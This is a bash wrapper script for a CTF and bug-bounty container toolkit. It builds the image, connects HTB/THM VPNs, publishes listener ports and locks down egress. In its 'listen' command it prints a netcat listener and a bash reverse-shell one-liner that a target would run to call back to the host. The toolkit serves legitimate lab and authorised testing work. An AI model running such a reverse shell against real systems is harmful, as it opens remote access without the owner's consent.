#!/usr/bin/env bash
# deck - driver for the toolkit. Thin wrapper over docker compose.
set -euo pipefail

cd "$(dirname "${BASH_SOURCE[0]}")"

DC=(docker compose)

# Every session is a throwaway container against the same volumes.
dcrun() { "${DC[@]}" run --rm deck "$@"; }

VPN_DIR=vpn

# Resolve which config to connect with, and echo its basename - the container
# sees vpn/ mounted at /root/vpn, so a bare name is all that travels. Prompts go
# to stderr so the caller can capture stdout. One exit point at the bottom, so
# the mount's own constraint is checked once for every way of choosing.
pick_vpn() {
  local given="$1" base=""

  if [ -n "$given" ]; then
    # A bare name resolves inside vpn/ first, so `deck vpn lab.ovpn` works from
    # anywhere and is also how a script picks one without a menu.
    if [ -f "$VPN_DIR/$given" ]; then
      base="$given"
    else
      [ -f "$given" ] || { echo "no such file: $given" >&2; return 1; }
      base="$(basename "$given")"
      # Copy it in rather than mounting a second path: one read-only mount is
      # the only thing the container needs to know about. Refuse to overwrite a
      # different file of the same name - vpn/ is a store you are told to fill,
      # not a scratch dir, and the thing being clobbered is a credential.
      if [ ! "$given" -ef "$VPN_DIR/$base" ]; then
        if [ -e "$VPN_DIR/$base" ] && ! cmp -s "$given" "$VPN_DIR/$base"; then
          echo "vpn/$base already exists and is a different file." >&2
          echo "  remove or rename it, or use the one there: ./deck vpn $base" >&2
          return 1
        fi
        cp "$given" "$VPN_DIR/$base"
      fi
    fi
  else
    # -type l as well as -type f: a symlink shows up in `ls`, so listing it and
    # refusing it below with a reason beats reporting "no .ovpn in vpn/" while
    # one is plainly sitting there.
    local found=()
    while IFS= read -r f; do found+=("$(basename "$f")"); done < <(
      find "$VPN_DIR" -maxdepth 1 \( -type f -o -type l \) -name '*.ovpn' 2>/dev/null | sort)

    if [ ${#found[@]} -eq 0 ]; then
      echo "no .ovpn in $VPN_DIR/ - put one there, or pass a path." >&2
      echo "  HTB: Access > OpenVPN.   THM: tryhackme.com/access" >&2
      return 1
    elif [ ${#found[@]} -eq 1 ]; then
      echo "using $VPN_DIR/${found[0]}" >&2
      base="${found[0]}"
    elif [ ! -t 0 ]; then
      # A menu written to a pipe would hang waiting on an answer nobody can give.
      echo "several configs in $VPN_DIR/ - name the one you want:" >&2
      printf '  ./deck vpn %s\n' "${found[@]}" >&2
      return 1
    else
      echo "configs in $VPN_DIR/:" >&2
      local i=1
      for f in "${found[@]}"; do echo "  $i) $f" >&2; i=$((i + 1)); done
      echo "  0) none - cancel" >&2
      local choice
      read -r -p "choose [0-${#found[@]}]: " choice
      case "$choice" in
        '')       echo "cancelled" >&2; return 1 ;;
        *[!0-9]*) echo "not a number: $choice" >&2; return 1 ;;
      esac
      # 10# before any comparison: "00" is all digits and passes a -le test, but
      # $((00 - 1)) is -1, and bash indexes an array from the end for that - so
      # an unnormalised "00" would connect to the last config, not cancel.
      choice=$((10#$choice))
      [ "$choice" -ne 0 ] || { echo "cancelled" >&2; return 1; }
      [ "$choice" -le ${#found[@]} ] || { echo "out of range: $choice" >&2; return 1; }
      base="${found[$((choice - 1))]}"
    fi
  fi

  # Only vpn/ is mounted, so a link out of it resolves on the host and nowhere
  # in the container. Fail here with the fix, not later as an openvpn read
  # error - and here, so every way of choosing gets the same check.
  if [ -L "$VPN_DIR/$base" ]; then
    echo "vpn/$base is a symlink, and the container mounts only vpn/ - copy" >&2
    echo "  the file in instead of linking to it." >&2
    return 1
  fi
  printf '%s\n' "$base"
}

usage() {
  cat <<'EOF'
deck - driver for icepick-offsec, a bug bounty & CTF toolkit

  ./deck build              build the image
  ./deck shell              interactive shell
  ./deck listen [ports...]  shell with listener ports published on the host
  ./deck vpn [file.ovpn]    connect an HTB/THM VPN, then drop into a shell
                            (no argument: use or choose from vpn/)
        [--socks [port]]    ...and a SOCKS5 proxy on 127.0.0.1:1080 for your browser
        [--lockdown]        ...and block all egress except the tunnel
  ./deck run <cmd...>       one-shot command, no shell
  ./deck wordlists          populate the shared wordlists volume (once)
  ./deck status             running containers
  ./deck stop               stop everything
  ./deck clean [--volumes]  remove containers (and optionally all data volumes)

Inside the container:
  whereami        user, capabilities, egress
  lockdown-lan    block RFC1918 egress, keep the public internet
  lockdown-wan    block everything except the VPN tunnel (needs tun0)
EOF
}

mkdir -p workspace vpn

case "${1:-}" in
  build) "${DC[@]}" build ;;

  # With no trailing args this drops you in a shell; with args it runs the
  # command and exits. `run` is the same thing, named for when that is the intent.
  shell) shift; dcrun "$@" ;;

  # A normal container publishes nothing, so a listener inside binds to the
  # private bridge IP nothing off-host can reach. `listen` publishes ports so a
  # target can call back - aim its payload at the host's IP below, not the
  # container's. (For HTB/THM use `deck vpn`: tun0 is already routable.)
  listen)
    shift
    ports=("$@")
    [ ${#ports[@]} -eq 0 ] && ports=(4444 8000 9001 443)
    pub=()
    for p in "${ports[@]}"; do pub+=(-p "${p}:${p}"); done

    # The address on the default route is the usual place a callback lands, but
    # it is only a guess: behind cloud NAT (AWS/GCE/Azure) the public IP never
    # appears locally, and a host firewalled to a VPN/tailnet is reachable only
    # on that interface. So print it as a guess and list every other local IPv4
    # next to it. macOS ships no `ip`, Linux no `ipconfig`, so ask whichever is
    # here.
    #
    # Every lookup ends in `|| true`. A bare assignment takes its command's
    # status, and under `set -e` + `pipefail` a host with no default route -
    # or no `ip` at all - would abort deck here rather than fall through to
    # the placeholder below, printing nothing and never starting the shell.
    case "$(uname -s)" in
      Darwin)
        iface=$(route get default 2>/dev/null | awk '/interface:/{print $2}') || true
        addr=$(ipconfig getifaddr "${iface:-en0}" 2>/dev/null || true)
        # Same intent as the Linux arm below: drop what a target can never call
        # back to. Track the interface name across ifconfig's indented blocks so
        # bridge/vmnet (Docker Desktop, UTM, VMware, Parallels) can be dropped by
        # name, and skip self-assigned 169.254 addresses. utun stays - that is
        # where a real VPN or tailnet address lives, which is the whole point.
        addrs=$(ifconfig 2>/dev/null |
                awk '/^[a-z][a-z0-9]*:/ { iface = $1; sub(/:$/, "", iface) }
                     /[ \t]inet / && iface !~ /^(lo|bridge|vmnet|vmenet|awdl|llw)/ &&
                     $2 !~ /^(127\.|169\.254\.)/ { print $2 }') || true ;;
      *)
        # A route lookup, not `hostname -I`: it picks the one source address
        # that egress actually uses on a multi-homed box.
        addr=$(ip route get 1.1.1.1 2>/dev/null |
               awk '{ for (i = 1; i < NF; i++) if ($i == "src") { print $(i+1); exit } }') || true
        # Every global IPv4, minus docker/bridge/veth - those reach nothing off-host.
        addrs=$(ip -o -4 addr show scope global 2>/dev/null |
                awk '$2 !~ /^(docker|br-|veth|virbr|cni)/ && $4 !~ /^169\.254\./ { print $4 }' |
                cut -d/ -f1) || true ;;
    esac
    # Where the lookup found nothing, promote the first real address rather than
    # printing a placeholder labelled "host default route" - which is a claim
    # about an address that was never found, sitting above the addresses that
    # were.
    why="(host default route)"
    if [ -z "$addr" ]; then
      addr=$(printf '%s\n' $addrs | head -1)
      why="(no default route - first local address)"
    fi
    if [ -z "$addr" ]; then
      addr='<your-host-IP>'
      why="(could not detect one)"
    fi

    echo "listener ports published on the host : ${ports[*]}"
    echo "best-guess callback address          : $addr   $why"
    for a in $addrs; do
      [ "$a" = "$addr" ] || echo "another address on this host         : $a"
    done
    echo "aim the payload at whichever one your target can reach: behind cloud"
    echo "NAT it is none of these (run: curl ifconfig.me); reachable only over a"
    echo "VPN/tailnet, it is that interface's address."
    echo "  e.g.  nc -lvnp 4444"
    echo "        target> bash -i >& /dev/tcp/$addr/4444 0>&1"
    echo "these ports stay open to anything that can reach this host on ${ports[*]}"
    echo "until you exit - on a public host that can mean the internet, so check"
    echo "your host and provider firewall."
    echo
    "${DC[@]}" run --rm "${pub[@]}" deck
    ;;

  # The config comes from vpn/, which is mounted read-only in the container, so
  # only its basename travels - as an env var, so an odd name can't break
  # anything. With no argument pick_vpn finds it or asks. Same container = same
  # netns, so the tunnel is live in the shell vpn-connect drops you into.
  vpn)
    shift
    cfg="" socks="" lockdown=""
    while [ $# -gt 0 ]; do
      case "$1" in
        # The port is optional, so only claim the next argument when it is one.
        --socks) socks=1080
                 [[ "${2:-}" =~ ^[0-9]+$ ]] && { socks="$2"; shift; } ;;
        --lockdown) lockdown=1 ;;
        -*)      echo "unknown option: $1" >&2; exit 1 ;;
        *)       cfg="$1" ;;
      esac
      shift
    done
    base="$(pick_vpn "$cfg")" || exit 1

    # Loopback only. The default `-p 1080:1080` would hand anything that can
    # reach this host - your LAN, or the internet on a VPS - an unauthenticated
    # route onto the lab network.
    args=(--rm -e OVPN="$base")
    [ -n "$socks" ] && args+=(-p "127.0.0.1:${socks}:${socks}" -e SOCKS="$socks")
    [ -n "$lockdown" ] && args+=(-e EGRESS_FIREWALL=on)

    echo "connecting via $base - exit the shell to disconnect"
    "${DC[@]}" run "${args[@]}" deck vpn-connect
    ;;

  run)
    shift
    [ $# -gt 0 ] || { echo "run what?" >&2; exit 1; }
    dcrun "$@"
    ;;

  wordlists) dcrun fetch-wordlists ;;

  status) "${DC[@]}" ps -a ;;
  stop)   "${DC[@]}" down ;;

  clean)
    if [ "${2:-}" = "--volumes" ]; then
      echo "This deletes the wordlists and tool-config volumes."
      echo "workspace/ on the host is untouched."
      read -r -p "continue? [y/N] " a
      [ "$a" = "y" ] || exit 0
      "${DC[@]}" down -v
    else
      "${DC[@]}" down
    fi
    ;;

  ""|-h|--help|help) usage ;;
  *) echo "unknown command: $1" >&2; echo; usage; exit 1 ;;
esac
